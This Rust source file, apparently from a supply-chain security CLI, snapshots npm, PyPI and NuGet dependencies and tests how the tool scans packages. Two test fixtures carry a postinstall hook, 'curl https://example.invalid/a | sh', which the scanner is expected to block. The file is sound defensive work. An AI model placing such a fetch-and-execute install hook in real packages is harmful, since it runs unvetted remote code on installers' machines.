            }
        };
        let versions: Vec<PackageVersionId> = meta
            .get("versions")
            .and_then(|v| v.as_object())
            .map(|o| {
                o.keys()
                    .filter_map(|version| PackageVersionId::parse(&Ecosystem::Npm, version).ok())
                    .collect()
            })
            .unwrap_or_default();
        let mut latest_satisfying: Option<&PackageVersionId> = None;
        for candidate in versions
            .iter()
            .filter(|version| version.satisfies_npm_range(&req))
        {
            let replace = match latest_satisfying {
                Some(current) => {
                    let ordering = candidate.precedence_cmp(current)?;
                    ordering.is_gt()
                        || (ordering.is_eq() && candidate.canonical() > current.canonical())
                }
                None => true,
            };
            if replace {
                latest_satisfying = Some(candidate);
            }
        }
        let Some(latest_satisfying) = latest_satisfying else {
            errors.push(serde_json::json!({"package": name, "error": format!("no version satisfies {range}")}));
            continue;
        };
        let pv: PackageVersion = match package_version_from_metadata(&meta, name, latest_satisfying)
        {
            Ok(pv) => pv,
            Err(e) => {
                errors.push(serde_json::json!({"package": name, "error": e.to_string()}));
                continue;
            }
        };
        let age_days = pv
            .published_at
            .map(|t| now.signed_duration_since(t).num_days())
            .unwrap_or(-1);
        let noop: Box<dyn supply_core::ports::VulnerabilitySource> =
            Box::new(NoopVulnerabilitySource);
        let cached: Box<dyn supply_core::ports::VulnerabilitySource> = if use_osv {
            let cache = osv_cache.map(|p| p.to_path_buf()).unwrap_or_else(|| {
                std::env::var_os("HOME")
                    .map(PathBuf::from)
                    .unwrap_or_else(std::env::temp_dir)
                    .join(".local/share/supply-core/osv-cache")
            });
            Box::new(
                OsvVulnerabilitySource::new(Box::new(ReqwestOsvTransport::new()?))
                    .with_cache(cache),
            )
        } else {
            noop
        };
        let decision = PackageEvaluator {
            policy,
            clock: &SystemClock,
            vulns: cached.as_ref(),
            metadata: &store,
            ledger: ledger.clone(),
        }
        .evaluate(&pv, VersionSelection::NpmRange(&req));
        let Some(decision) = handle_npm_evaluation_result(decision, name, &mut errors)? else {
            continue;
        };
        entries.push(serde_json::json!({
            "package": name,
            "range": range,
            "resolved": latest_satisfying.to_string(),
            "age_days": age_days,
            "status": format!("{:?}", decision.status),
            "reasons": decision.reasons,
            "warnings": decision.warnings,
        }));
    }
    let out = serde_json::json!({
        "ledger_status": supply_core::application::ledger::LEDGER_PENDING,
        "captured_at": now.to_rfc3339(),
        "repository": root.display().to_string(),
        "policy": { "quarantine_days": policy.quarantine.minimum_age_days },
        "dependencies": entries,
        "errors": errors,
    });
    println!("{}", serde_json::to_string_pretty(&out)?);
    Ok(())
}

fn handle_npm_evaluation_result(
    result: Result<supply_core::domain::Decision>,
    name: &str,
    errors: &mut Vec<serde_json::Value>,
) -> Result<Option<supply_core::domain::Decision>> {
    match result {
        Ok(decision) => Ok(Some(decision)),
        Err(error)
            if error
                .downcast_ref::<supply_core::application::ledger::LedgerRecordingError>()
                .is_some() =>
        {
            Err(error)
        }
        Err(error) => {
            errors.push(serde_json::json!({"package": name, "error": error.to_string()}));
            Ok(None)
        }
    }
}

fn vulnerability_source(
    use_osv: bool,
    osv_cache: Option<&Path>,
) -> Result<Box<dyn supply_core::ports::VulnerabilitySource>> {
    if !use_osv {
        return Ok(Box::new(NoopVulnerabilitySource));
    }
    let cache = osv_cache.map(Path::to_path_buf).unwrap_or_else(|| {
        std::env::var_os("HOME")
            .map(PathBuf::from)
            .unwrap_or_else(std::env::temp_dir)
            .join(".local/share/supply-core/osv-cache")
    });
    Ok(Box::new(
        OsvVulnerabilitySource::new(Box::new(ReqwestOsvTransport::new()?)).with_cache(cache),
    ))
}

fn snapshot_pip(
    root: &Path,
    policy: &supply_core::domain::Policy,
    use_osv: bool,
    osv_cache: Option<&Path>,
    findings: Option<&Path>,
    ledger: &supply_core::application::ledger::LedgerRecorder,
) -> Result<()> {
    let content = std::fs::read_to_string(root.join("requirements.txt"))?;
    let (pins, gaps) = parse_requirements(&content);
    let registry = HttpPyPiRegistry::new()?;
    let store = MemoryMetadataStore::default();
    if let Some(path) = findings {
        supply_core::adapters::storage::FindingFile::new(path).load_into(&store)?;
    }
    let vulns = vulnerability_source(use_osv, osv_cache)?;
    let now = chrono::Utc::now();
    let mut entries = vec![];
    let mut errors: Vec<serde_json::Value> = gaps
        .into_iter()
        .map(|gap| serde_json::json!({ "input": gap }))
        .collect();
    for pin in &pins {
        let name = &pin.name;
        let pinned = &pin.version;
        let version = match PackageVersionId::parse(&Ecosystem::PyPi, pinned) {
            Ok(version) => version,
            Err(error) => {
                errors.push(serde_json::json!({
                    "package": name,
                    "error": format!("invalid PEP 440 version {pinned}: {error}; not evaluated"),
                }));
                continue;
            }
        };
        let payload = match registry.release(name, pinned) {
            Ok(payload) => payload,
            Err(error) => {
                errors.push(serde_json::json!({ "package": name, "error": error.to_string() }));
                continue;
            }
        };
        let pv = match package_version_from_pypi(&payload, name, &version, &pin.hashes) {
            Ok(pv) => pv,
            Err(error) => {
                errors.push(serde_json::json!({ "package": name, "error": error.to_string() }));
                continue;
            }
        };
        let age_days = pv
            .published_at
            .map(|t| now.signed_duration_since(t).num_days())
            .unwrap_or(-1);
        let decision = PackageEvaluator {
            policy,
            clock: &SystemClock,
            vulns: vulns.as_ref(),
            metadata: &store,
            ledger: ledger.clone(),
        }
        .evaluate(&pv, VersionSelection::Exact)?;
        entries.push(serde_json::json!({
            "package": name,
            "pinned": pinned,
            "age_days": age_days,
            "status": format!("{:?}", decision.status),
            "reasons": decision.reasons,
            "warnings": decision.warnings,
        }));
    }
    let out = serde_json::json!({
        "ledger_status": supply_core::application::ledger::LEDGER_PENDING,
        "captured_at": now.to_rfc3339(),
        "repository": root.display().to_string(),
        "ecosystem": "pypi",
        "dependencies": entries,
        "errors": errors,
    });
    println!("{}", serde_json::to_string_pretty(&out)?);
    Ok(())
}

fn snapshot_nuget(
    root: &Path,
    policy: &supply_core::domain::Policy,
    use_osv: bool,
    osv_cache: Option<&Path>,
    findings: Option<&Path>,
    ledger: &supply_core::application::ledger::LedgerRecorder,
) -> Result<()> {
    let content = std::fs::read_to_string(root.join("packages.lock.json"))?;
    let (pins, gaps) = parse_packages_lock(&content)?;
    let registry = HttpNuGetRegistry::new()?;
    let store = MemoryMetadataStore::default();
    if let Some(path) = findings {
        supply_core::adapters::storage::FindingFile::new(path).load_into(&store)?;
    }
    let vulns = vulnerability_source(use_osv, osv_cache)?;
    let now = chrono::Utc::now();
    let mut entries = vec![];
    let mut errors: Vec<serde_json::Value> = gaps
        .into_iter()
        .map(|gap| serde_json::json!({ "input": gap }))
        .collect();
    for pin in &pins {
        let name = &pin.name;
        let pinned = &pin.version;
        let version = match PackageVersionId::parse(&Ecosystem::NuGet, pinned) {
            Ok(version) => version,
            Err(error) => {
                errors.push(serde_json::json!({
                    "package": name,
                    "error": format!("invalid NuGet version {pinned}: {error}; not evaluated"),
                }));
                continue;
            }
        };
        let payload = match registry.release(name, pinned) {
            Ok(payload) => payload,
            Err(error) => {
                errors.push(serde_json::json!({ "package": name, "error": error.to_string() }));
                continue;
            }
        };
        let pv = match package_version_from_nuget(&payload, name, &version, None, None) {
            Ok(pv) => pv,
            Err(error) => {
                errors.push(serde_json::json!({ "package": name, "error": error.to_string() }));
                continue;
            }
        };
        let age_days = pv
            .published_at
            .map(|t| now.signed_duration_since(t).num_days())
            .unwrap_or(-1);
        let decision = PackageEvaluator {
            policy,
            clock: &SystemClock,
            vulns: vulns.as_ref(),
            metadata: &store,
            ledger: ledger.clone(),
        }
        .evaluate(&pv, VersionSelection::Exact)?;
        entries.push(serde_json::json!({
            "package": name,
            "pinned": pinned,
            "age_days": age_days,
            "status": format!("{:?}", decision.status),
            "reasons": decision.reasons,
            "warnings": decision.warnings,
        }));
    }
    let out = serde_json::json!({
        "ledger_status": supply_core::application::ledger::LEDGER_PENDING,
        "captured_at": now.to_rfc3339(),
        "repository": root.display().to_string(),
        "ecosystem": "nuget",
        "dependencies": entries,
        "errors": errors,
    });
    println!("{}", serde_json::to_string_pretty(&out)?);
    Ok(())
}

#[cfg(test)]
mod cli_tests {
    use super::*;
    #[cfg(unix)]
    #[test]
    fn capture_lock_cannot_escape_to_exec_children() -> Result<()> {
        use std::os::fd::AsRawFd;
        use std::process::Command;

        let file = tempfile::tempfile()?;
        let fd = file.as_raw_fd();
        let flags = unsafe { libc::fcntl(fd, libc::F_GETFD) };
        assert!(flags >= 0);
        assert_eq!(
            unsafe { libc::fcntl(fd, libc::F_SETFD, flags & !libc::FD_CLOEXEC) },
            0
        );
        capture_lock_close_on_exec(fd)?;
        let child = Command::new("/bin/sh")
            .arg("-c")
            .arg(format!("test ! -e /dev/fd/{fd}"))
            .status()?;
        assert!(child.success(), "capture lock reached an exec child");
        assert!(capture_lock_close_on_exec(-1).is_err());
        Ok(())
    }

    #[test]
    fn version_flag_is_supported() {
        match Cli::try_parse_from(["supply", "--version"]) {
            Ok(_) => panic!("--version must not parse as a subcommand"),
            Err(error) => assert_eq!(error.kind(), clap::error::ErrorKind::DisplayVersion),
        }
    }
    #[test]
    fn ecosystem_subcommands_parse() -> Result<()> {
        let cli = Cli::try_parse_from(["supply", "snapshot-pip"])?;
        assert!(matches!(cli.command, Command::SnapshotPip { .. }));
        let cli = Cli::try_parse_from(["supply", "snapshot-nuget", "dir"])?;
        assert!(matches!(cli.command, Command::SnapshotNuGet { .. }));
        let cli = Cli::try_parse_from(["supply", "scan-docker", "--json"])?;
        assert!(matches!(
            cli.command,
            Command::ScanDocker { json: true, .. }
        ));
        let cli = Cli::try_parse_from(["supply", "report", "findings.json", "--submit"])?;
        assert!(matches!(cli.command, Command::Report { submit: true, .. }));
        let cli = Cli::try_parse_from([
            "supply",
            "scan-package",
            "npm",
            "evil.tgz",
            "--name",
            "evil",
            "--version",
            "1.2.3",
            "--scratch-dir",
            "/tmp/supply-scratch",
            "--json",
        ])?;
        assert!(matches!(
            cli.command,
            Command::ScanPackage {
                json: true,
                scratch_dir: Some(path),
                ..
            } if path == Path::new("/tmp/supply-scratch")
        ));
        let cli = Cli::try_parse_from([
            "supply",
            "snapshot-pip",
            "dir",
            "--findings",
            "findings.jsonl",
        ])?;
        assert!(matches!(cli.command, Command::SnapshotPip { .. }));
        let cli = Cli::try_parse_from([
            "supply",
            "snapshot-nuget",
            "dir",
            "--findings",
            "findings.jsonl",
        ])?;
        assert!(matches!(cli.command, Command::SnapshotNuGet { .. }));
        Ok(())
    }
    #[test]
    fn durable_ledger_path_is_configurable() -> Result<()> {
        let cli = Cli::try_parse_from(["supply", "snapshot-pip", "--ledger-db", "ledger.sqlite"])?;
        assert_eq!(cli.ledger_db.as_deref(), Some(Path::new("ledger.sqlite")));
        Ok(())
    }
    #[test]
    fn snapshot_npm_propagates_ledger_recording_failures() {
        let mut errors = Vec::new();
        let failure = anyhow::Error::new(supply_core::application::ledger::LedgerRecordingError)
            .context("ledger append failed");

        let result = handle_npm_evaluation_result(Err(failure), "left-pad", &mut errors);

        assert!(result.is_err());
        assert!(errors.is_empty());
    }

    #[test]
    fn snapshot_npm_keeps_ordinary_evaluation_errors_per_package() -> Result<()> {
        let mut errors = Vec::new();
        let result = handle_npm_evaluation_result(
            Err(anyhow::anyhow!("vulnerability source unavailable")),
            "left-pad",
            &mut errors,
        )?;

        assert!(result.is_none());
        assert_eq!(errors[0]["package"], "left-pad");
        Ok(())
    }

    #[test]
    fn scan_package_supports_nuget_init_scripts() -> Result<()> {
        use std::io::Write;

        let directory = tempfile::tempdir()?;
        let archive = directory.path().join("sample.nupkg");
        let file = std::fs::File::create(&archive)?;
        let mut package = zip::ZipWriter::new(file);
        let options = zip::write::SimpleFileOptions::default()
            .compression_method(zip::CompressionMethod::Deflated);
        package.start_file("tools/init.ps1", options)?;
        package.write_all(b"Write-Host 'package initialization'")?;
        package.finish()?;
        let scratch = directory.path().join("scratch");
        std::fs::create_dir(&scratch)?;
        let ledger = supply_core::application::ledger::LedgerRecorder::open(
            directory.path().join("ledger.sqlite"),
        )?;

        let report = scan_package(
            "nuget",
            &archive,
            "sample",
            "1.0.0",
            ScanPackageOptions {
                external: None,
                scratch_dir: Some(&scratch),
                findings_out: None,
                policy: &supply_core::domain::Policy::default(),
                ledger: &ledger,
            },
        )?;

        assert_eq!(
            report.decision,
            supply_core::application::ledger::ScanDecision::Block
        );
        assert!(report
            .engines
            .iter()
            .flat_map(|engine| &engine.findings)
            .any(|finding| finding.rule == "nuget-init-ps1"));
        Ok(())
    }
    #[test]
    fn package_scan_requires_scratch_for_inventory() -> Result<()> {
        let directory = tempfile::tempdir()?;
        let ledger = supply_core::application::ledger::LedgerRecorder::open(
            directory.path().join("ledger.sqlite"),
        )?;
        let archive = directory.path().join("package.tgz");
        let manifest = r#"{"name":"research-fixture","version":"1.0.0","scripts":{"postinstall":"curl https://example.invalid/a | sh"}}"#;
        let encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        let mut tar = tar::Builder::new(encoder);
        let mut header = tar::Header::new_gnu();
        header.set_size(manifest.len() as u64);
        header.set_mode(0o644);
        header.set_mtime(0);
        header.set_cksum();
        tar.append_data(&mut header, "package/package.json", manifest.as_bytes())?;
        std::fs::write(&archive, tar.into_inner()?.finish()?)?;

        let report = scan_package(
            "npm",
            &archive,
            "research-fixture",
            "1.0.0",
            ScanPackageOptions {
                external: None,
                scratch_dir: None,
                findings_out: None,
                policy: &supply_core::domain::Policy::default(),
                ledger: &ledger,
            },
        )?;

        assert_eq!(
            report.decision,
            supply_core::application::ledger::ScanDecision::Incomplete
        );
        assert_eq!(
            report.coverage,
            supply_core::application::ledger::Coverage::Partial
        );
        assert_eq!(report.artifact_sha256, None);
        Ok(())
    }

    #[cfg(unix)]
    #[test]
    fn package_scan_does_not_hash_symlink_after_staging_rejection() -> Result<()> {
        let directory = tempfile::tempdir()?;
        let ledger = supply_core::application::ledger::LedgerRecorder::open(
            directory.path().join("ledger.sqlite"),
        )?;
        let target = directory.path().join("outside.tgz");
        std::fs::write(&target, b"not an archive")?;
        let archive = directory.path().join("package.tgz");
        std::os::unix::fs::symlink(&target, &archive)?;
        let scratch = directory.path().join("scratch");
        std::fs::create_dir(&scratch)?;

        let report = scan_package(
            "npm",
            &archive,
            "research-fixture",
            "1.0.0",
            ScanPackageOptions {
                external: None,
                scratch_dir: Some(&scratch),
                findings_out: None,
                policy: &supply_core::domain::Policy::default(),
                ledger: &ledger,
            },
        )?;

        assert_eq!(
            report.decision,
            supply_core::application::ledger::ScanDecision::Incomplete
        );
        assert_eq!(report.artifact_sha256, None);
        Ok(())
    }

    #[test]
    fn package_scan_preserves_static_block_when_external_scanner_fails() -> Result<()> {
        use std::os::unix::fs::PermissionsExt;

        let directory = tempfile::tempdir()?;
        let ledger = supply_core::application::ledger::LedgerRecorder::open(
            directory.path().join("ledger.sqlite"),
        )?;
        let archive = directory.path().join("package.tgz");
        let content = r#"{"name":"left-pad","scripts":{"postinstall":"curl https://example.invalid/a | sh"}}"#;
        let encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        let mut tar = tar::Builder::new(encoder);
        let mut header = tar::Header::new_gnu();
        header.set_size(content.len() as u64);
        header.set_mode(0o644);
        header.set_mtime(0);
        header.set_cksum();
        tar.append_data(&mut header, "package/package.json", content.as_bytes())?;
        std::fs::write(&archive, tar.into_inner()?.finish()?)?;

        let executable = std::env::current_exe()?;
        let tools = tempfile::tempdir_in(
            executable
                .parent()
                .ok_or_else(|| anyhow::anyhow!("test executable has no parent directory"))?,
        )?;
        let external = tools.path().join("scanner.sh");
        std::fs::write(&external, "#!/bin/sh\nexit 1\n")?;
        let mut permissions = std::fs::metadata(&external)?.permissions();
        permissions.set_mode(0o755);
        std::fs::set_permissions(&external, permissions)?;

        let report = scan_package(
            "npm",
            &archive,
            "left-pad",
            "1.0.0",
            ScanPackageOptions {
                external: Some(&external),
                scratch_dir: Some(directory.path()),
                findings_out: None,
                policy: &supply_core::domain::Policy::default(),
                ledger: &ledger,
            },
        )?;
        assert_eq!(
            report.decision,
            supply_core::application::ledger::ScanDecision::Block
        );
        assert_eq!(
            report.coverage,
            supply_core::application::ledger::Coverage::Partial
        );
        let events = ledger.events_from(0, 10)?;
        assert_eq!(events.len(), 1);
        assert_eq!(
            events[0].kind,
            supply_core::application::ledger::LedgerEventKind::ScanCompleted
        );
        let body = match &events[0].body.details {
            supply_core::application::ledger::LedgerEventDetails::ScanCompleted(body) => body,
            _ => panic!("expected scan_completed event"),
        };
        assert!(body.evidence.scanner_findings.iter().any(|finding| {
            finding
                .rules
                .iter()
                .any(|rule| rule == "install-script-pipe")
        }));
        let expected_reason = if cfg!(target_os = "linux") {
            "scanner_execution_failed"
        } else {
            "scanner_memory_limit_unavailable"
        };
        assert!(body.evidence.engine_reports.iter().any(|report| {
            report.source == "external-scan" && report.reason.as_deref() == Some(expected_reason)
        }));
        Ok(())
    }
    #[test]
    fn external_scanner_is_incomplete_when_large_scratch_quota_is_unavailable() -> Result<()> {
        let scanner = supply_core::adapters::command_scanner::CommandScanner::new(
            "missing-scanner-for-large-archive",
            "external-scan",
        );
        let mut archive = tempfile::tempfile()?;
        let report = external_scanner_report(
            &scanner,
            &mut archive,
            ExternalScannerContext {
                ecosystem: &Ecosystem::Npm,
                archive_path: Path::new("missing-archive"),
                name: "fixture",
                version: &PackageVersionId::parse(&Ecosystem::Npm, "1.0.0")?,
                artifact_sha256: &"a".repeat(64),
                large_scan: true,
            },
        );

        assert_eq!(
            report.coverage,
            supply_core::application::ledger::Coverage::Unknown
        );
        assert_eq!(report.processed_inputs, 0);
        assert_eq!(
            report.reason.as_deref(),
            Some("scanner_scratch_quota_unavailable")
        );
        Ok(())
    }

    #[test]
    fn package_scan_records_missing_archive_failure() -> Result<()> {
        let directory = tempfile::tempdir()?;
        let ledger = supply_core::application::ledger::LedgerRecorder::open(
            directory.path().join("ledger.sqlite"),
        )?;
        let archive = directory.path().join("missing.tgz");

        let report = scan_package(
            "npm",
            &archive,
            "left-pad",
            "1.0.0",
            ScanPackageOptions {
                external: None,
                scratch_dir: Some(directory.path()),
                findings_out: None,
                policy: &supply_core::domain::Policy::default(),
                ledger: &ledger,
            },
        )?;
        assert_eq!(
            report.decision,
            supply_core::application::ledger::ScanDecision::Incomplete
        );

        let events = ledger.events_from(0, 10)?;
        assert_eq!(events.len(), 1);
        assert_eq!(
            events[0].kind,
            supply_core::application::ledger::LedgerEventKind::ScanFailed
        );
        assert!(matches!(
            &events[0].body.details,
            supply_core::application::ledger::LedgerEventDetails::ScanFailed(body)
                if body.evidence.coverage == Some(supply_core::application::ledger::Coverage::Partial)
        ));
        Ok(())
    }

    #[test]
    fn package_scan_records_external_scanner_failure_as_incomplete() -> Result<()> {
        use std::os::unix::fs::PermissionsExt;

        let directory = tempfile::tempdir()?;
        let ledger = supply_core::application::ledger::LedgerRecorder::open(
            directory.path().join("ledger.sqlite"),
        )?;
        let archive = directory.path().join("package.tgz");
        let encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        let mut tar = tar::Builder::new(encoder);
        let content = r#"{"name":"left-pad"}"#;
        let mut header = tar::Header::new_gnu();
        header.set_size(content.len() as u64);
        header.set_mode(0o644);
        header.set_mtime(0);
        header.set_cksum();
        tar.append_data(&mut header, "package/package.json", content.as_bytes())?;
        std::fs::write(&archive, tar.into_inner()?.finish()?)?;

        let executable = std::env::current_exe()?;
        let tools = tempfile::tempdir_in(
            executable
                .parent()
                .ok_or_else(|| anyhow::anyhow!("test executable has no parent directory"))?,
        )?;
        let external = tools.path().join("scanner.sh");
        std::fs::write(&external, "#!/bin/sh\nexit 1\n")?;
        let mut permissions = std::fs::metadata(&external)?.permissions();
        permissions.set_mode(0o755);
        std::fs::set_permissions(&external, permissions)?;

        let report = scan_package(
            "npm",
            &archive,
            "left-pad",
            "1.0.0",
            ScanPackageOptions {
                external: Some(&external),
                scratch_dir: Some(directory.path()),
                findings_out: None,
                policy: &supply_core::domain::Policy::default(),
                ledger: &ledger,
            },
        )?;
        assert_eq!(
            report.decision,
            supply_core::application::ledger::ScanDecision::Incomplete
        );
        let events = ledger.events_from(0, 10)?;
        assert_eq!(events.len(), 1);
        assert_eq!(
            events[0].kind,
            supply_core::application::ledger::LedgerEventKind::ScanCompleted
        );
        let body = match &events[0].body.details {
            supply_core::application::ledger::LedgerEventDetails::ScanCompleted(body) => body,
            _ => panic!("expected scan_completed event"),
        };
        assert_eq!(
            body.evidence.coverage,
            Some(supply_core::application::ledger::Coverage::Partial)
        );
        let expected_reason = if cfg!(target_os = "linux") {
            "scanner_execution_failed"
        } else {
            "scanner_memory_limit_unavailable"
        };
        assert!(body.evidence.engine_reports.iter().any(|report| {
            report.source == "external-scan" && report.reason.as_deref() == Some(expected_reason)
        }));
        Ok(())
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn package_scan_records_external_scanner_finding() -> Result<()> {
        use std::os::unix::fs::PermissionsExt;

        let directory = tempfile::tempdir()?;
        let ledger = supply_core::application::ledger::LedgerRecorder::open(
            directory.path().join("ledger.sqlite"),
        )?;
        let archive = directory.path().join("package.tgz");
        let encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        let mut tar = tar::Builder::new(encoder);
        let content = r#"{"name":"left-pad"}"#;
        let mut header = tar::Header::new_gnu();
        header.set_size(content.len() as u64);
        header.set_mode(0o644);
        header.set_mtime(0);
        header.set_cksum();
        tar.append_data(&mut header, "package/package.json", content.as_bytes())?;
        std::fs::write(&archive, tar.into_inner()?.finish()?)?;

        let executable = std::env::current_exe()?;
        let executable_directory = executable
            .parent()
            .ok_or_else(|| anyhow::anyhow!("test executable has no parent directory"))?;
        let tools = tempfile::tempdir_in(executable_directory)?;
        let scratch = directory.path().join("scratch");
        std::fs::create_dir(&scratch)?;
        let external = tools.path().join("scanner.sh");
        std::fs::write(
            &external,
            "#!/bin/sh\nprintf '%s\\n' '{\"score\":8,\"rules\":[\"danger\"],\"summary\":\"dangerous install\"}'\n",
        )?;
        let mut permissions = std::fs::metadata(&external)?.permissions();
        permissions.set_mode(0o755);
        std::fs::set_permissions(&external, permissions)?;

        let report = scan_package(
            "npm",
            &archive,
            "left-pad",
            "1.0.0",
            ScanPackageOptions {
                external: Some(&external),
                scratch_dir: Some(&scratch),
                findings_out: None,
                policy: &supply_core::domain::Policy::default(),
                ledger: &ledger,
            },
        )?;
        assert_eq!(
            report.decision,
            supply_core::application::ledger::ScanDecision::Block
        );
        assert_eq!(
            report.coverage,
            supply_core::application::ledger::Coverage::Partial
        );

        let events = ledger.events_from(0, 10)?;
        assert_eq!(events.len(), 1);
        let evidence = match &events[0].body.details {
            supply_core::application::ledger::LedgerEventDetails::ScanCompleted(body) => {
                serde_json::to_value(&body.evidence)?
            }
            _ => panic!("expected scan_completed event"),
        };
        assert!(evidence["score"].is_null());
        assert_eq!(evidence["scanner_findings"][0]["source"], "external-scan");
        assert_eq!(evidence["scanner_findings"][0]["rules"][0], "danger");
        assert_eq!(
            evidence["scanner_findings"][0]["summary"],
            "scanner reported a finding"
        );
        let external_report = evidence["engine_reports"]
            .as_array()
            .and_then(|reports| {
                reports
                    .iter()
                    .find(|report| report["source"] == "external-scan")
            })
            .ok_or_else(|| anyhow::anyhow!("external scanner report is missing"))?;
        assert_eq!(external_report["findings"][0]["policy_score"], "8");
        assert_eq!(
            external_report["findings"][0]["location"],
            serde_json::Value::Null
        );
        let artifact_sha256 = evidence["artifact_sha256"]
            .as_str()
            .ok_or_else(|| anyhow::anyhow!("scan artifact digest is missing"))?;
        let finding_id = external_report["findings"][0]["id"]
            .as_str()
            .ok_or_else(|| anyhow::anyhow!("external scanner finding ID is missing"))?;
        let policy_sha256 = events[0]
            .body
            .identity
            .engine_policy_revision
            .as_deref()
            .ok_or_else(|| anyhow::anyhow!("engine policy revision is missing"))?;
        let expires_at = chrono::Utc::now() + chrono::Duration::hours(1);
        ledger.record_rule_approval(
            artifact_sha256,
            finding_id,
            &"f".repeat(64),
            expires_at,
            "wrong policy revision",
        )?;
        let mismatched_approval_report = scan_package(
            "npm",
            &archive,
            "left-pad",
            "1.0.0",
            ScanPackageOptions {
                external: Some(&external),
                scratch_dir: Some(directory.path()),
                findings_out: None,
                policy: &supply_core::domain::Policy::default(),
                ledger: &ledger,
            },
        )?;
        assert_eq!(
            mismatched_approval_report.decision,
            supply_core::application::ledger::ScanDecision::Block
        );

        ledger.record_rule_approval(
            artifact_sha256,
            finding_id,
            policy_sha256,
            expires_at,
            "reviewed",
        )?;
        let approved_report = scan_package(
            "npm",
            &archive,
            "left-pad",
            "1.0.0",
            ScanPackageOptions {
                external: Some(&external),
                scratch_dir: Some(directory.path()),
                findings_out: None,
                policy: &supply_core::domain::Policy::default(),
                ledger: &ledger,
            },
        )?;
        assert_eq!(
            approved_report.decision,
            supply_core::application::ledger::ScanDecision::Incomplete
        );
        assert_eq!(
            approved_report.coverage,
            supply_core::application::ledger::Coverage::Partial
        );
        Ok(())
    }

    #[test]
    fn annotations_flag_is_accepted() -> Result<()> {
        let cli = Cli::try_parse_from(["supply", "scan-actions", "--annotations"])?;
        assert!(matches!(
            cli.command,
            Command::ScanActions {
                annotations: true,
                json: false,
                ..
            }
        ));
        Ok(())
    }

    #[test]
    fn annotations_and_json_are_mutually_exclusive() {
        let error = Cli::try_parse_from(["supply", "scan-actions", "--annotations", "--json"])
            .err()
            .map(|error| error.kind());
        assert_eq!(error, Some(clap::error::ErrorKind::ArgumentConflict));
    }

    #[test]
    fn scan_pipelines_flags_accepted() -> Result<()> {
        let cli = Cli::try_parse_from(["supply", "scan-pipelines", "--annotations"])?;
        assert!(matches!(
            cli.command,
            Command::ScanPipelines {
                annotations: true,
                json: false,
                ..
            }
        ));
        let cli_alias = Cli::try_parse_from(["supply", "scan-azure-pipelines", "--json"])?;
        assert!(matches!(
            cli_alias.command,
            Command::ScanPipelines {
                annotations: false,
                json: true,
                ..
            }
        ));
        Ok(())
    }

    #[test]
    fn scan_pipelines_annotations_and_json_conflict() {
        let error = Cli::try_parse_from(["supply", "scan-pipelines", "--annotations", "--json"])
            .err()
            .map(|error| error.kind());
        assert_eq!(error, Some(clap::error::ErrorKind::ArgumentConflict));
    }

    #[test]
    fn explicit_model_block_survives_incomplete_coverage_and_high_threshold() -> Result<()> {
        use supply_core::application::ledger::{
            Coverage, EngineFinding, EngineReport, LedgerEvent, LedgerEventDetails, LedgerIdentity,
            LedgerSourceKind, PackageEvidence, ScanCompletedBody, ScanDecision,
        };

        let artifact_sha256 = "a".repeat(64);
        let evidence = PackageEvidence {
            artifact_sha256: Some(artifact_sha256.clone()),
            coverage: Some(Coverage::Partial),
            source_kind: Some(LedgerSourceKind::Scanner),
            engine_reports: vec![EngineReport {
                source: "modelscan".to_string(),
                version: Some("0.8.8".to_string()),
                rule_bundle_sha256: None,
                database_sha256: None,
                input_sha256: Some(artifact_sha256.clone()),
                expected_inputs: 1,
                processed_inputs: 0,
                coverage: Coverage::Partial,
                findings: vec![EngineFinding {
                    id: "b".repeat(64),
                    rule: "dangerous-deserialization".to_string(),
                    summary: "HIGH model finding".to_string(),
                    location: None,
                    native_severity: Some("HIGH".to_string()),
                    policy_score: Some(rust_decimal::Decimal::from(4)),
                }],
                reason: Some("scanner_incomplete".to_string()),
            }],
            ..PackageEvidence::default()
        };
        let identity = LedgerIdentity {
            observation_id: Some("hard-block-case".to_string()),
            ecosystem: Some(Ecosystem::Npm),
            name: Some("fixture".to_string()),
            version: Some("1.0.0".to_string()),
            artifact_identity: Some(format!("sha256:{artifact_sha256}")),
            generation: Some("1".to_string()),
            engine_policy_revision: Some("c".repeat(64)),
            ..LedgerIdentity::default()
        };
        let event = LedgerEvent::new(
            "supply-core",
            identity,
            Some(chrono::Utc::now()),
            LedgerEventDetails::ScanCompleted(ScanCompletedBody { evidence }),
        )?;
        let mut policy = supply_core::domain::Policy::default();
        policy.quarantine_scanner.block_score = 10;

        let report = artifact_report_from_event(&event, &policy, &BTreeSet::new())?;

        assert_eq!(report.decision, ScanDecision::Block);
        assert_eq!(report.coverage, Coverage::Partial);
        let approved_finding_ids = BTreeSet::from(["b".repeat(64)]);
        let approved_report = artifact_report_from_event(&event, &policy, &approved_finding_ids)?;
        assert_eq!(approved_report.decision, ScanDecision::Incomplete);
        assert_eq!(approved_report.coverage, Coverage::Partial);
        assert_eq!(approved_report.engines[0].findings.len(), 1);
        Ok(())
    }

    #[test]
    fn rule_approval_only_excludes_exact_finding_ids() -> Result<()> {
        use supply_core::application::ledger::{
            Coverage, EngineFinding, EngineReport, LedgerEvent, LedgerEventDetails, LedgerIdentity,
            LedgerSourceKind, PackageEvidence, ScanCompletedBody, ScanDecision,
        };

        let artifact_sha256 = "a".repeat(64);
        let approved_id = "b".repeat(64);
        let other_id = "d".repeat(64);
        let findings = [approved_id.clone(), other_id.clone()]
            .map(|id| EngineFinding {
                id,
                rule: "script-rule".to_string(),
                summary: "scanner reported a finding".to_string(),
                location: None,
                native_severity: None,
                policy_score: Some(rust_decimal::Decimal::from(8)),
            })
            .to_vec();
        let evidence = PackageEvidence {
            artifact_sha256: Some(artifact_sha256.clone()),
            coverage: Some(Coverage::Complete),
            score: Some("8".to_string()),
            source_kind: Some(LedgerSourceKind::Scanner),
            engine_reports: vec![EngineReport {
                source: "guarddog".to_string(),
                version: Some("3.2.0".to_string()),
                rule_bundle_sha256: Some("e".repeat(64)),
                database_sha256: None,
                input_sha256: Some(artifact_sha256.clone()),
                expected_inputs: 1,
                processed_inputs: 1,
                coverage: Coverage::Complete,
                findings,
                reason: None,
            }],
            ..PackageEvidence::default()
        };
        let event = LedgerEvent::new(
            "supply-core",
            LedgerIdentity {
                observation_id: Some("two-rule-approval-case".to_string()),
                ecosystem: Some(Ecosystem::Npm),
                name: Some("fixture".to_string()),
